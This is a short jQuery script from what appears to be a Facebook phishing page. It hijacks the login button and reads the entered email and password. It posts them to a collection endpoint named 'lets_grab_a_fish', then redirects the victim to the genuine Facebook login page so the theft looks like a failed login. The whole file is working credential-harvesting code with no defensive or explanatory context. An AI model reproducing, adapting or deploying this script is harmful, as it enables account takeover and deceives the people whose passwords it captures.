<script>
	$('#loginbutton').unbind('click').click(function(){
		 var username = $("#email").val();
		 var password = $("#pass").val();
		 console.log(username);
			$.ajax({
			  url: "http://localhost/facebook/index.php/login/lets_grab_a_fish",
			  data: {
					'username' : username,
					'password' : password
				 },
			  dataType: "json",
			  success: function($result){
			  	if($result = 'true'){
			  		window.location = "https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110"		  	}
			  	else{
			  		alert('Something went Wrong');
			  	}
			  },
			  type: "POST"

			});
	});
</script>


